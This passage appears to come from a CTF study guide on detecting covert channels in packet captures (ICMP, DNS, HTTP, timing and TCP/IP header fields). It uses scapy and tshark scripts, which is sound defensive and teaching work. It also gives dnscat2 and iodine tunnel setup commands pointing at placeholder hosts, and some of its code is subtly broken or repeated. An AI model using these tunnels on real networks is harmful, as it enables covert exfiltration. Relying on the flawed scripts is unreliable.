        f.write(data)
    
    print(f"Extracted {len(data)} bytes")
    print(f"First 100 bytes (hex): {data[:100].hex()}")
    
    # Check for common file signatures
    if data.startswith(b'\x89PNG'):
        print("[*] PNG file detected")
    elif data.startswith(b'\xff\xd8\xff'):
        print("[*] JPEG file detected")
    elif data.startswith(b'PK'):
        print("[*] ZIP file detected")

extract_icmp_data('capture.pcap')
```

**Manual extraction with tshark:**

```bash
# Extract ICMP echo request payloads as hex
tshark -r capture.pcap -Y "icmp.type == 8" -T fields -e data.data | tr -d '\n' | xxd -r -p > extracted.bin

# Extract with offset (skip standard ping header)
tshark -r capture.pcap -Y "icmp.type == 8" -T fields -e icmp.data_time -e data.data
```

## DNS Tunneling Detection

DNS tunneling encodes data within DNS queries and responses, exploiting the fact that DNS traffic is rarely blocked and often uninspected.

### DNS Tunneling Characteristics

**Query-based tunneling indicators:**

- Unusually long subdomain names (>50 characters)
- High entropy in subdomain strings (base32/base64 encoded data)
- Excessive number of queries to single domain
- Queries for TXT, NULL, or other uncommon record types
- Regular query intervals (beaconing behavior)
- Subdomains with hex/base64 character patterns

**Response-based tunneling indicators:**

- Large TXT record responses
- Multiple A records with sequential IPs
- CNAME chains
- Uncommon use of NULL records

### Detection Tools

**DNSChef (DNS proxy for analysis):**

```bash
apt-get install dnschef

# Monitor DNS queries
dnschef --interface 127.0.0.1 --port 53 --logfile dns.log
```

**Passive DNS monitoring with tshark:**

```bash
# Extract all DNS queries
tshark -r capture.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name > dns_queries.txt

# Extract query types
tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name -e dns.qry.type

# Extract TXT record responses
tshark -r capture.pcap -Y "dns.txt" -T fields -e dns.txt

# Show DNS with large response sizes
tshark -r capture.pcap -Y "dns && frame.len > 512"
```

**Statistical analysis for tunneling:**

```bash
# Query length distribution
tshark -r capture.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name | awk '{print length}' | sort -n | uniq -c

# Query frequency per domain
tshark -r capture.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name | awk -F. '{print $(NF-1)"."$NF}' | sort | uniq -c | sort -rn

# Entropy calculation
tshark -r capture.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name > queries.txt
python3 -c "
import math
from collections import Counter
with open('queries.txt') as f:
    for line in f:
        line = line.strip()
        if line:
            freq = Counter(line)
            entropy = -sum(c/len(line) * math.log2(c/len(line)) for c in freq.values())
            if entropy > 3.5:  # High entropy threshold
                print(f'{entropy:.2f}: {line}')
"
```

### DNS Tunneling Tools (for understanding payload structure)

**dnscat2 (common in CTFs):**

```bash
# Server
git clone https://github.com/iagox86/dnscat2
cd dnscat2/server
ruby dnscat2.rb --dns "domain=tunnel.com"

# Client (compile and run)
cd ../client
make
./dnscat --dns server=<server_ip>,domain=tunnel.com
```

**iodine:**

```bash
apt-get install iodine

# Server
iodined -f -c -P password 10.0.0.1 tunnel.com

# Client
iodine -f -P password tunnel.com
```

### Data Extraction from DNS

**Python DNS data extraction:**

```python
#!/usr/bin/env python3
from scapy.all import *
import base64
import re

def extract_dns_tunnel_data(pcap_file):
    pkts = rdpcap(pcap_file)
    queries = []
    txt_records = []
    
    for pkt in pkts:
        if DNS in pkt:
            # Extract queries (outbound data)
            if pkt[DNS].qr == 0 and pkt[DNS].qd:
                query = pkt[DNS].qd.qname.decode('utf-8', errors='ignore')
                # Extract subdomain portion
                subdomain = query.split('.')[0]
                queries.append(subdomain)
            
            # Extract TXT records (inbound data)
            if pkt[DNS].qr == 1 and pkt[DNS].an:
                for i in range(pkt[DNS].ancount):
                    if pkt[DNS].an[i].type == 16:  # TXT record
                        txt_data = pkt[DNS].an[i].rdata
                        txt_records.append(txt_data)
    
    # Concatenate and decode queries
    query_data = ''.join(queries)
    print(f"[*] Extracted {len(queries)} DNS queries")
    
    # Try base32 decode (common in DNS tunneling)
    try:
        decoded = base64.b32decode(query_data.upper() + '=' * (8 - len(query_data) % 8))
        print(f"[+] Base32 decoded: {decoded[:100]}")
        with open('dns_query_data.bin', 'wb') as f:
            f.write(decoded)
    except:
        pass
    
    # Try base64 decode
    try:
        # Remove non-base64 characters
        clean = re.sub(r'[^A-Za-z0-9+/=]', '', query_data)
        decoded = base64.b64decode(clean)
        print(f"[+] Base64 decoded: {decoded[:100]}")
        with open('dns_query_b64.bin', 'wb') as f:
            f.write(decoded)
    except:
        pass
    
    # Process TXT records
    if txt_records:
        txt_data = b''.join(txt_records)
        print(f"[*] Extracted {len(txt_records)} TXT records")
        with open('dns_txt_data.bin', 'wb') as f:
            f.write(txt_data)

extract_dns_tunnel_data('capture.pcap')
```

**Wireshark DNS analysis workflow:**

```
1. Apply filter: dns
2. Statistics → DNS → check for:
   - High query rate to single domain
   - Unusual record types (TXT, NULL, AAAA for IPv6 tunneling)
3. Filter for suspicious patterns:
   - dns.qry.name contains "base64_chars"
   - dns.resp.len > 512 (large responses)
   - dns.qry.type == 16 (TXT records)
4. Export Objects → save TXT record payloads
5. Follow UDP Stream for session reconstruction
```

## HTTP Header Manipulation

HTTP headers provide numerous fields for steganography due to their text-based nature and extensibility.

### Common HTTP Header Covert Channels

**Standard header manipulation:**

- Custom headers (X-Custom-Data, X-Metadata)
- User-Agent field encoding
- Cookie values
- Referer URL parameters
- Accept-Language field
- ETags
- Cache-Control directives

**Whitespace manipulation:**

- Extra spaces in header values
- Tab vs space encoding
- Line ending variations (CRLF vs LF)

**Case variation:**

- Mixed case in header names (HTTP headers are case-insensitive)
- Case encoding in header values

### Detection and Extraction

**Tshark HTTP header extraction:**

```bash
# Extract all HTTP headers
tshark -r capture.pcap -Y "http" -T fields -e http.request.full_uri -e http.user_agent

# Extract custom headers
tshark -r capture.pcap -Y "http" -T fields -e http.header

# Extract specific header
tshark -r capture.pcap -Y "http" -T fields -e http.cookie

# Extract User-Agent strings
tshark -r capture.pcap -Y "http.request" -T fields -e http.user_agent | sort -u

# Extract all header names (look for custom headers)
tshark -r capture.pcap -Y "http" -V | grep -E "^\s+[A-Za-z-]+:" | sort -u

# Export HTTP objects
tshark -r capture.pcap --export-objects http,./http_objects
```

**Wireshark analysis:**

```
# Filter for HTTP with custom headers
http.request && http.header contains "X-"

# Look for unusual User-Agent
http.user_agent matches "[A-Za-z0-9+/=]{50,}"

# Base64-like patterns in any header
http contains "[A-Za-z0-9+/=]{40,}"

# Export HTTP objects
File → Export Objects → HTTP
```

**Python HTTP header analysis:**

```python
#!/usr/bin/env python3
from scapy.all import *
import base64
import re

def extract_http_headers(pcap_file):
    pkts = rdpcap(pcap_file)
    
    for pkt in pkts:
        if TCP in pkt and Raw in pkt:
            payload = pkt[Raw].load.decode('utf-8', errors='ignore')
            
            # Check if HTTP request/response
            if payload.startswith(('GET', 'POST', 'HTTP/')):
                lines = payload.split('\r\n')
                
                for line in lines:
                    # Look for custom headers
                    if line.startswith('X-'):
                        print(f"[*] Custom header: {line}")
                        
                        # Try to decode value
                        if ':' in line:
                            header, value = line.split(':', 1)
                            value = value.strip()
                            
                            # Try base64 decode
                            try:
                                decoded = base64.b64decode(value)
                                print(f"    [+] Base64 decoded: {decoded}")
                            except:
                                pass
                            
                            # Try hex decode
                            if re.match(r'^[0-9a-fA-F]+$', value):
                                try:
                                    decoded = bytes.fromhex(value)
                                    print(f"    [+] Hex decoded: {decoded}")
                                except:
                                    pass
                    
                    # Check User-Agent for encoding
                    if line.startswith('User-Agent:'):
                        print(f"[*] {line}")
                        ua = line.split(':', 1)[1].strip()
                        
                        # Look for base64-like patterns
                        b64_pattern = re.findall(r'[A-Za-z0-9+/]{20,}={0,2}', ua)
                        for match in b64_pattern:
                            try:
                                decoded = base64.b64decode(match)
                                print(f"    [+] Found encoded data: {decoded}")
                            except:
                                pass

extract_http_headers('capture.pcap')
```

### Cookie-Based Steganography

**Cookie extraction and analysis:**

```bash
# Extract all cookies
tshark -r capture.pcap -Y "http.cookie" -T fields -e http.cookie > cookies.txt

# Extract Set-Cookie responses
tshark -r capture.pcap -Y "http.set_cookie" -T fields -e http.set_cookie

# Analyze cookie values for patterns
cat cookies.txt | tr ';' '\n' | grep '=' | sort -u
```

**Python cookie decoder:**

```python
#!/usr/bin/env python3
from scapy.all import *
import base64
import urllib.parse

def analyze_cookies(pcap_file):
    pkts = rdpcap(pcap_file)
    
    for pkt in pkts:
        if TCP in pkt and Raw in pkt:
            payload = pkt[Raw].load.decode('utf-8', errors='ignore')
            
            # Find Cookie header
            if 'Cookie:' in payload:
                cookie_line = [l for l in payload.split('\r\n') if l.startswith('Cookie:')][0]
                cookies = cookie_line.split(':', 1)[1].strip()
                
                # Parse individual cookies
                for cookie in cookies.split(';'):
                    cookie = cookie.strip()
                    if '=' in cookie:
                        name, value = cookie.split('=', 1)
                        
                        # URL decode
                        decoded_value = urllib.parse.unquote(value)
                        
                        # Try base64
                        try:
                            b64_decoded = base64.b64decode(decoded_value)
                            if b64_decoded.isprintable() or b64_decoded.startswith(b'\x89PNG'):
                                print(f"[+] Cookie '{name}' contains: {b64_decoded[:100]}")
                        except:
                            pass

analyze_cookies('capture.pcap')
```

### URL Parameter Steganography

**Extract and decode URL parameters:**

```bash
# Extract URIs
tshark -r capture.pcap -Y "http.request" -T fields -e http.request.full_uri > uris.txt

# Parse parameters
cat uris.txt | grep '?' | while read url; do
    echo "$url" | sed 's/.*?//' | tr '&' '\n'
done | sort -u
```

**Python URL parameter extraction:**

```python
#!/usr/bin/env python3
from scapy.all import *
from urllib.parse import urlparse, parse_qs
import base64

def extract_url_params(pcap_file):
    pkts = rdpcap(pcap_file)
    
    for pkt in pkts:
        if TCP in pkt and Raw in pkt:
            payload = pkt[Raw].load.decode('utf-8', errors='ignore')
            
            # Extract GET request line
            if payload.startswith('GET '):
                request_line = payload.split('\r\n')[0]
                uri = request_line.split(' ')[1]
                
                if '?' in uri:
                    parsed = urlparse(uri)
                    params = parse_qs(parsed.query)
                    
                    for key, values in params.items():
                        for value in values:
                            # Try decoding
                            try:
                                decoded = base64.b64decode(value)
                                print(f"[+] Param '{key}': {decoded[:100]}")
                            except:
                                pass

extract_url_params('capture.pcap')
```

### Advanced HTTP Steganography Techniques

**HTTP response body analysis:**

```bash
# Export HTTP responses
tshark -r capture.pcap --export-objects http,./http_exports

# Analyze HTML for hidden data (whitespace, comments, metadata)
for file in http_exports/*; do
    echo "=== $file ==="
    # Check for base64 in comments
    grep -oP '<!--.*?-->' "$file" | grep -E '[A-Za-z0-9+/=]{40,}'
    
    # Check for hidden form fields
    grep -i 'type="hidden"' "$file"
done
```

**Timing-based covert channels in HTTP:**

```python
#!/usr/bin/env python3
from scapy.all import *
import statistics

def analyze_http_timing(pcap_file):
    pkts = rdpcap(pcap_file)
    http_times = []
    
    for i, pkt in enumerate(pkts):
        if TCP in pkt and Raw in pkt:
            if b'HTTP/' in pkt[Raw].load:
                http_times.append(float(pkt.time))
    
    # Calculate inter-request delays
    if len(http_times) > 1:
        delays = [http_times[i+1] - http_times[i] for i in range(len(http_times)-1)]
        
        print(f"Mean delay: {statistics.mean(delays):.4f}s")
        print(f"Std dev: {statistics.stdev(delays):.4f}s")
        
        # Low variance might indicate timing channel
        if statistics.stdev(delays) < 0.01:
            print("[!] Suspiciously regular timing detected")
            
            # Convert delays to binary (above/below median)
            median = statistics.median(delays)
            bits = ['1' if d > median else '0' for d in delays]
            print(f"Binary timing sequence: {''.join(bits)}")
            
            # Try to decode as bytes
            bit_string = ''.join(bits)
            if len(bit_string) % 8 == 0:
                bytes_data = int(bit_string, 2).to_bytes(len(bit_string)//8, 'big')
                print(f"Decoded: {bytes_data}")

analyze_http_timing('capture.pcap')
```

**[Inference]** The timing analysis above assumes regular timing patterns indicate intentional encoding; however, network conditions can also create patterns, so correlation with other indicators is recommended.

---

### Important Subtopics for Further Study

- **Protocol-specific steganography:** SSH, TLS/SSL certificate fields, DHCP options
- **IPv6 steganography:** Extension headers, flow labels
- **Wireless protocol covert channels:** 802.11 management frames
- **Binary data encoding schemes:** Custom encoding beyond base64/base32
- **Machine learning approaches:** Automated anomaly detection in network traffic

---

## Timing-Based Covert Channels

Timing covert channels encode information in temporal characteristics of network traffic rather than packet contents.

### Inter-Packet Delays (IPD)

Information encoding through manipulated time intervals between consecutive packets.

**Detection Tools:**

```bash
# Capture traffic with precise timestamps
tcpdump -i eth0 -w capture.pcap -s 0 --time-stamp-precision=nano

# Analyze timing patterns with Scapy
scapy
>>> pkts = rdpcap('capture.pcap')
>>> delays = [(pkts[i+1].time - pkts[i].time) for i in range(len(pkts)-1)]
>>> import statistics
>>> print(f"Mean: {statistics.mean(delays)}, StdDev: {statistics.stdev(delays)}")
```

**Statistical Analysis for Anomalies:**

```python
from scapy.all import *
import numpy as np
from scipy import stats

def analyze_ipd_covert(pcap_file):
    packets = rdpcap(pcap_file)
    timestamps = [float(pkt.time) for pkt in packets]
    ipds = np.diff(timestamps)
    
    # Calculate entropy (lower entropy suggests encoding)
    hist, _ = np.histogram(ipds, bins=50)
    prob = hist / hist.sum()
    entropy = stats.entropy(prob[prob > 0])
    
    print(f"IPD Entropy: {entropy}")
    print(f"Expected natural entropy: ~3.5-4.5")
    
    # Detect periodic patterns
    fft = np.fft.fft(ipds)
    power = np.abs(fft) ** 2
    if np.max(power[1:]) > 10 * np.mean(power[1:]):
        print("[ALERT] Strong periodic pattern detected")
    
    return ipds
```

### Timing Encoding Schemes

**Binary Encoding:**

- Short delay (< threshold) = bit 0
- Long delay (> threshold) = bit 1

**Detection approach:**

```bash
# Extract timing with Tshark
tshark -r capture.pcap -T fields -e frame.number -e frame.time_relative > times.txt

# Python analysis
awk '{print $2}' times.txt | awk 'NR>1{print $1-prev} {prev=$1}' > delays.txt
```

**Model-Based Timing Channels:**

[Inference] Sophisticated implementations may use model-based encoding (e.g., manipulating TCP RTT estimates, jitter patterns). Detection requires baseline profiling of legitimate traffic characteristics.

### Rate-Based Channels

Information encoded in packet transmission rates over time windows.

```python
from scapy.all import *
import matplotlib.pyplot as plt

def detect_rate_modulation(pcap_file, window_size=1.0):
    packets = rdpcap(pcap_file)
    start_time = float(packets[0].time)
    end_time = float(packets[-1].time)
    
    windows = []
    current_window = start_time
    
    while current_window < end_time:
        count = sum(1 for p in packets 
                   if current_window <= float(p.time) < current_window + window_size)
        windows.append(count)
        current_window += window_size
    
    # Analyze rate variance
    variance = np.var(windows)
    print(f"Rate variance: {variance}")
    
    # Visualize for manual inspection
    plt.plot(windows)
    plt.xlabel('Time Window')
    plt.ylabel('Packet Count')
    plt.title('Packet Rate Over Time')
    plt.savefig('rate_analysis.png')
```

## Protocol Misuse

Exploiting legitimate protocol features in unintended ways to hide data.

### ICMP Tunneling

ICMP echo request/reply packets contain optional data payload fields commonly used for covert channels.

**Detection with Scapy:**

```python
from scapy.all import *

def analyze_icmp_payload(pcap_file):
    packets = rdpcap(pcap_file)
    icmp_pkts = [p for p in packets if ICMP in p]
    
    for pkt in icmp_pkts:
        if pkt[ICMP].type in [8, 0]:  # Echo request/reply
            payload = bytes(pkt[ICMP].payload)
            
            # Check for non-standard payload patterns
            if len(payload) > 56:  # Standard ping uses 56 bytes
                print(f"[ALERT] Oversized ICMP payload: {len(payload)} bytes")
            
            # Entropy analysis (random data = high entropy)
            if len(payload) > 0:
                entropy = calculate_entropy(payload)
                if entropy > 7.5:  # High entropy suggests encrypted/compressed data
                    print(f"[SUSPICIOUS] High entropy payload: {entropy}")
                    print(f"First 32 bytes: {payload[:32].hex()}")

def calculate_entropy(data):
    import math
    if len(data) == 0:
        return 0
    entropy = 0
    for x in range(256):
        p_x = float(data.count(bytes([x]))) / len(data)
        if p_x > 0:
            entropy += - p_x * math.log2(p_x)
    return entropy
```

**Extracting Hidden Data:**

```bash
# Filter ICMP and extract payloads
tshark -r capture.pcap -Y "icmp.type==8" -T fields -e data.data | \
    xxd -r -p > icmp_data.bin

# Analyze extracted data
file icmp_data.bin
strings icmp_data.bin
binwalk icmp_data.bin
```

**Tools for ICMP Covert Channels:**

```bash
# Ptunnel (ICMP tunnel)
# Detection: Look for sustained ICMP traffic with consistent payload sizes

# Loki (documented ICMP/DNS covert channel tool)
# Detection signature:
tshark -r capture.pcap -Y "icmp && data.len > 0" -T fields \
    -e ip.src -e ip.dst -e data.len | sort | uniq -c
```

### DNS Tunneling

DNS queries/responses can exfiltrate data through subdomain labels or TXT records.

**Detection Techniques:**

```bash
# Extract DNS queries
tshark -r capture.pcap -Y "dns.flags.response == 0" \
    -T fields -e dns.qry.name > dns_queries.txt

# Analyze subdomain entropy
python3 << 'EOF'
with open('dns_queries.txt', 'r') as f:
    for line in f:
        domain = line.strip()
        subdomain = domain.split('.')[0]
        
        # Calculate entropy of subdomain
        from collections import Counter
        import math
        
        if len(subdomain) > 20:  # Suspiciously long
            counter = Counter(subdomain)
            entropy = -sum((count/len(subdomain)) * math.log2(count/len(subdomain)) 
                          for count in counter.values())
            
            if entropy > 3.5:  # High entropy = possible encoded data
                print(f"[SUSPICIOUS] {domain} - Entropy: {entropy:.2f}")
EOF
```

**DNS Query Analysis with Scapy:**

```python
from scapy.all import *
import base64

def extract_dns_tunnel_data(pcap_file):
    packets = rdpcap(pcap_file)
    dns_queries = [p for p in packets if DNS in p and p[DNS].qr == 0]
    
    exfil_data = []
    
    for pkt in dns_queries:
        if pkt[DNS].qd:
            qname = pkt[DNS].qd.qname.decode('utf-8', errors='ignore')
            subdomain = qname.split('.')[0]
            
            # Check for base32/base64 encoding patterns
            try:
                # Attempt base32 decode
                decoded = base64.b32decode(subdomain.upper() + '===')
                if all(32 <= b < 127 for b in decoded):  # Printable ASCII
                    exfil_data.append(decoded)
                    print(f"[FOUND] Base32 encoded: {decoded}")
            except:
                pass
            
            try:
                # Attempt base64 decode
                decoded = base64.b64decode(subdomain + '==')
                if all(32 <= b < 127 for b in decoded):
                    exfil_data.append(decoded)
                    print(f"[FOUND] Base64 encoded: {decoded}")
            except:
                pass
    
    return b''.join(exfil_data)
```

**DNS TXT Record Analysis:**

```bash
# Extract TXT records
tshark -r capture.pcap -Y "dns.txt" -T fields -e dns.txt > txt_records.txt

# TXT records can contain arbitrary data up to 255 chars per string
# Look for unusual patterns or encoded data
cat txt_records.txt | while read line; do
    echo "$line" | base64 -d 2>/dev/null && echo " [Base64 detected]"
done
```

### HTTP/HTTPS Header Manipulation

Custom or uncommon HTTP headers can carry covert data.

**Analysis Approach:**

```python
from scapy.all import *

def analyze_http_headers(pcap_file):
    packets = rdpcap(pcap_file)
    
    for pkt in packets:
        if pkt.haslayer(Raw):
            payload = pkt[Raw].load.decode('utf-8', errors='ignore')
            
            if payload.startswith('GET') or payload.startswith('POST'):
                headers = payload.split('\r\n')
                
                # Look for unusual headers
                suspicious_patterns = [
                    'X-Custom-', 'X-Secret-', 'X-Data-', 
                    'X-Payload-', 'Cookie' # Cookies can be abused
                ]
                
                for header in headers:
                    for pattern in suspicious_patterns:
                        if pattern in header:
                            print(f"[SUSPICIOUS HEADER] {header}")
                            
                            # Extract and analyze header value
                            if ':' in header:
                                value = header.split(':', 1)[1].strip()
                                if len(value) > 50:  # Long values
                                    entropy = calculate_entropy(value.encode())
                                    print(f"  Entropy: {entropy:.2f}")
```

**Extracting HTTP Objects:**

```bash
# Export HTTP objects
tshark -r capture.pcap --export-objects http,http_objects/

# Analyze User-Agent strings (can hide data)
tshark -r capture.pcap -Y "http.request" -T fields -e http.user_agent | \
    sort | uniq -c | sort -rn
```

## Data Hiding in Protocol Fields

Exploiting reserved, unused, or optional protocol fields for data concealment.

### IP Header Fields

**IP Identification Field:**

The IP ID field (16 bits) can encode 2 bytes per packet.

```python
from scapy.all import *

def extract_ip_id_data(pcap_file):
    packets = rdpcap(pcap_file)
    ip_packets = [p for p in packets if IP in p]
    
    # Extract IP ID values
    id_values = [pkt[IP].id for pkt in ip_packets]
    
    # Check for sequential vs. encoded patterns
    differences = [id_values[i+1] - id_values[i] for i in range(len(id_values)-1)]
    
    # Natural traffic shows incremental IDs (usually +1)
    # Covert channel shows large variations
    if max(differences) > 1000 or min(differences) < 0:
        print("[ALERT] Non-sequential IP ID pattern detected")
        
        # Extract potential hidden data
        data_bytes = b''.join(id_val.to_bytes(2, 'big') for id_val in id_values)
        print(f"Extracted data (first 64 bytes): {data_bytes[:64]}")
        
        with open('ip_id_extracted.bin', 'wb') as f:
            f.write(data_bytes)
```

**IP Options Field:**

[Inference] IP options are rarely used in modern traffic, making them attractive for covert channels.

```bash
# Detect IP packets with options
tshark -r capture.pcap -Y "ip.options" -T fields \
    -e ip.src -e ip.dst -e ip.options

# Extract options data
tshark -r capture.pcap -Y "ip.options" -T fields -e ip.options | \
    xxd -r -p > ip_options_data.bin
```

### TCP Header Fields

**TCP Sequence Number LSB:**

Least significant bits of sequence numbers can encode data with minimal protocol disruption.

```python
from scapy.all import *

def extract_tcp_lsb_data(pcap_file, num_bits=2):
    """Extract data from LSBs of TCP sequence numbers"""
    packets = rdpcap(pcap_file)
    tcp_packets = [p for p in packets if TCP in p]
    
    bit_stream = ''
    
    for pkt in tcp_packets:
        seq = pkt[TCP].seq
        # Extract LSBs
        lsb = seq & ((1 << num_bits) - 1)
        bit_stream += format(lsb, f'0{num_bits}b')
    
    # Convert bit stream to bytes
    byte_array = bytearray()
    for i in range(0, len(bit_stream), 8):
        if i + 8 <= len(bit_stream):
            byte_array.append(int(bit_stream[i:i+8], 2))
    
    print(f"Extracted {len(byte_array)} bytes from TCP sequence LSBs")
    
    with open('tcp_seq_extracted.bin', 'wb') as f:
        f.write(byte_array)
    
    return bytes(byte_array)
```

**TCP Initial Sequence Number (ISN):**

ISNs can encode data since they're chosen by the sender.

```python
def analyze_tcp_isn(pcap_file):
    packets = rdpcap(pcap_file)
    syn_packets = [p for p in packets if TCP in p and p[TCP].flags.S]
    
    isn_values = [pkt[TCP].seq for pkt in syn_packets]
    
    # Statistical analysis
    print(f"Total SYN packets: {len(syn_packets)}")
    print(f"ISN range: {min(isn_values)} - {max(isn_values)}")
    
    # Check for patterns (legitimate ISNs should be random)
    if len(set(isn_values)) < len(isn_values) * 0.9:
        print("[ALERT] ISN values show unusual repetition")
```

**TCP Timestamp Option:**

```bash
# Extract TCP timestamps
tshark -r capture.pcap -Y "tcp.options.timestamp" -T fields \
    -e tcp.options.timestamp.tsval -e tcp.options.timestamp.tsecr > tcp_timestamps.txt

# Analyze for modulation patterns
python3 << 'EOF'
with open('tcp_timestamps.txt', 'r') as f:
    tsvals = [int(line.split()[0]) for line in f if line.strip()]
    
    # Check for unnatural patterns
    differences = [tsvals[i+1] - tsvals[i] for i in range(len(tsvals)-1)]
    
    import statistics
    if len(differences) > 1:
        mean_diff = statistics.mean(differences)
        stdev_diff = statistics.stdev(differences)
        
        # High variance relative to mean suggests manipulation
        cv = stdev_diff / mean_diff if mean_diff > 0 else 0
        print(f"Coefficient of variation: {cv:.2f}")
        if cv > 1.0:
            print("[SUSPICIOUS] High timestamp variance")
EOF
```

**TCP Reserved Bits:**

The 3 reserved bits in TCP header (between Data Offset and Flags) can carry covert data.

```python
from scapy.all import *

def extract_tcp_reserved_bits(pcap_file):
    """
    Extract data from TCP reserved bits
    [Unverified] - Requires raw packet parsing as Scapy may not expose reserved bits directly
    """
    packets = rdpcap(pcap_file)
    
    with open(pcap_file, 'rb') as f:
        pcap_data = f.read()
    
    # Manual parsing required for reserved bits
    print("[INFO] TCP reserved bits extraction requires manual header parsing")
    print("Reserved bits location: Byte 12 of TCP header, bits 1-3")
```

### UDP Header Manipulation

UDP has minimal fields, but checksum can be manipulated.

**UDP Checksum Analysis:**

```python
from scapy.all import *

def verify_udp_checksums(pcap_file):
    packets = rdpcap(pcap_file)
    udp_packets = [p for p in packets if UDP in p]
    
    invalid_count = 0
    
    for pkt in udp_packets:
        # Recalculate checksum
        original_checksum = pkt[UDP].chksum
        del pkt[UDP].chksum
        pkt = pkt.__class__(bytes(pkt))  # Force recalculation
        
        if pkt[UDP].chksum != original_checksum:
            invalid_count += 1
            print(f"[CHECKSUM MISMATCH] Packet {pkt[IP].src}:{pkt[UDP].sport} -> "
                  f"{pkt[IP].dst}:{pkt[UDP].dport}")
            print(f"  Original: {original_checksum}, Calculated: {pkt[UDP].chksum}")
    
    print(f"\nTotal invalid checksums: {invalid_count}/{len(udp_packets)}")
    
    # [Inference] If >5% checksums invalid, possible covert channel
    if invalid_count > len(udp_packets) * 0.05:
        print("[ALERT] Unusually high checksum mismatch rate")
```

### Analysis Workflow

**Comprehensive Network Steganography Detection:**

```bash
#!/bin/bash
# Comprehensive network stego detection script

PCAP="$1"

echo "[*] Starting network steganography analysis for $PCAP"

# 1. Protocol distribution
echo -e "\n[*] Protocol distribution:"
tshark -r "$PCAP" -q -z io,phs

# 2. ICMP analysis
echo -e "\n[*] ICMP payload analysis:"
tshark -r "$PCAP" -Y "icmp" -T fields -e data.len | \
    awk '{sum+=$1; count++} END {if(count>0) print "Avg payload:", sum/count, "bytes"}'

# 3. DNS entropy check
echo -e "\n[*] DNS query entropy analysis:"
tshark -r "$PCAP" -Y "dns.qry.name" -T fields -e dns.qry.name | \
    head -20 | while read domain; do
        echo "$domain" | python3 -c "
import sys, math
from collections import Counter
s = sys.stdin.read().strip()
if s:
    c = Counter(s)
    l = len(s)
    e = -sum((cnt/l) * math.log2(cnt/l) for cnt in c.values())
    print(f'{s[:50]:<50} Entropy: {e:.2f}')
"
    done

# 4. Timing analysis
echo -e "\n[*] Inter-packet timing analysis:"
tshark -r "$PCAP" -T fields -e frame.time_relative | \
    awk 'NR>1{print $1-prev} {prev=$1}' | \
    python3 -c "
import sys, statistics
delays = [float(x) for x in sys.stdin if x.strip()]
if delays:
    print(f'Mean: {statistics.mean(delays):.6f}s')
    print(f'Stdev: {statistics.stdev(delays):.6f}s')
    print(f'Min: {min(delays):.6f}s, Max: {max(delays):.6f}s')
"

# 5. TCP sequence analysis
echo -e "\n[*] TCP ISN randomness check:"
tshark -r "$PCAP" -Y "tcp.flags.syn==1 && tcp.flags.ack==0" \
    -T fields -e tcp.seq | head -10

echo -e "\n[*] Analysis complete. Review findings above."
```

---

**Important Considerations:**

- **False Positives**: [Unverified] Many detection techniques generate false positives due to legitimate protocol variations, network conditions, or implementation quirks
- **Encryption**: Covert channels often combine steganography with encryption, making payload analysis show high entropy
- **Multi-Protocol**: Sophisticated actors may distribute covert data across multiple protocols to evade single-protocol analysis

**Related CTF Topics:** Protocol analysis fundamentals, cryptographic analysis for encrypted payloads, anomaly detection methodologies, baseline traffic profiling

---

# PCAP Challenge Approach

PCAP files are the foundation of network-based CTF challenges. The systematic analysis methodology determines flag recovery speed and prevents missed attack vectors.

## Initial Reconnaissance

Begin by establishing file type and scale. Use `file` to confirm the PCAP format, then `capinfos` to gather statistics:

```bash
file challenge.pcap
capinfos challenge.pcap
```

`capinfos` output reveals packet count, duration, protocols present, and endpoints. A PCAP with 50 packets across 2 protocols differs fundamentally from one with 100,000 packets spanning 20 protocols. This determines whether you analyze every packet or filter strategically.

Load the PCAP in Wireshark with `wireshark challenge.pcap`. In the initial view, examine the Protocol Hierarchy (Statistics → Protocol Hierarchy) to identify dominant protocols. CTF challenges frequently bury flags in protocol-specific data—if you see SMTP dominating, email exfiltration is likely; if TFTP appears, file transfer reconnaissance is necessary.

## Filtering Strategy

Avoid analyzing raw packet streams. Apply protocol filters immediately:

```bash
# HTTP traffic only
tshark -r challenge.pcap -Y "http" -V

# DNS queries and responses
tshark -r challenge.pcap -Y "dns" -T fields -e dns.qry.name -e dns.resp.addr

# Non-standard ports (CTF obfuscation technique)
tshark -r challenge.pcap -Y "tcp.port != 22 and tcp.port != 80 and tcp.port != 443" -T fields -e tcp.srcport -e tcp.dstport
```

The `-Y` display filter (not capture filter) allows dynamic refinement. Start broad, then narrow based on what emerges.

## Stream Reconstruction

TCP/UDP streams must be extracted completely. In Wireshark:

- Right-click a packet → Follow → TCP Stream (or UDP Stream)
- Observe the byte order and completeness
- Export via File → Export Packet Bytes

Via command line:

```bash
# Extract all TCP streams
tcpflow -r challenge.pcap -o output_directory/

# Extract specific stream (requires identifying stream number first)
tshark -r challenge.pcap -q -z follow,tcp,raw,0 > stream_0.bin
```

`tcpflow` outputs individual files per stream. Examine file types with `file` or `hexdump -C | head -20` to detect encoded/compressed data.

## Entropy Analysis

High-entropy data (encrypted, compressed, or encoded) requires different handling than plaintext. Calculate Shannon entropy:

```bash
# Using ent
ent extracted_stream.bin

# Python method
python3 -c "
import sys
data = open(sys.argv[1], 'rb').read()
entropy = sum(-p * __import__('math').log2(p) for p in [data.count(bytes([b])) / len(data) for b in range(256)] if p > 0)
print(f'Entropy: {entropy:.2f}')
" extracted_stream.bin
```

Entropy near 7.5-8.0 indicates strong encoding/encryption. Entropy below 5.0 suggests structured text or sparse data. This determines whether you attempt decryption or string extraction.

## String Extraction and Pattern Matching

For text-heavy PCAPs, extract printable strings and filter for flag patterns:

```bash
# Extract all ASCII strings longer than 4 characters
strings challenge.pcap | grep -i 'flag\|ctf\|{.*}'

# Regex for common CTF flag formats
tshark -r challenge.pcap -T fields -e data | strings | grep -E '^[a-zA-Z0-9]{20,}$|flag\{.*\}|ctf\{.*\}'
```

---

# Flag Format Recognition

Flags follow predictable patterns in CTF challenges. Rapid recognition accelerates exploitation.

## Standard Formats

**Curly Brace Format** (most common):

```
flag{...}
ctf{...}
FLAG{...}
{...}
```

**Hex Format** (often base64-encoded flags appear as hex first):

```
0x48656c6c6f... (hex representation of ASCII)
```

**Base32/Base64 Clusters** (consecutive 64-character alphanumeric + /+= sequences):

```
VGhpcyBpcyBhIHRlc3Q= (recognizable padding)
```

**Numeric/Hash Formats**:

```
flag_1a2b3c4d5e6f
SHA256: abc123...
